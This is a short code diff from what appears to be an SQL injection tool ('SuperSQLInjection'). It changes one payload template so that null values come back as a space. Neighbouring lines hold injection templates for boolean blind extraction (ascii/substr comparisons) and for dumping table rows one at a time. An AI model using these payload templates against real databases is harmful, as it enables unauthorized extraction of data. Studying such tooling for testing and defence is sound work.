@@ -46,7 +46,7 @@ namespace SuperSQLInjection.payload
         //bool方式获取值
         public static String bool_value = " ascii(substr({data},{index},1))>{len}";
 
-        public static String cast_value = "rtrim(cast({data} as char(254)))";
+        public static String cast_value = "coalesce(rtrim(cast({data} as char(254))),chr(32))";
 
         //获取行数据
         public static String data_value = "(select "+ cast_value + " from (select {allcolumns},rownumber() over() rownum from {dbname}.{table}) t where t.rownum={index})";
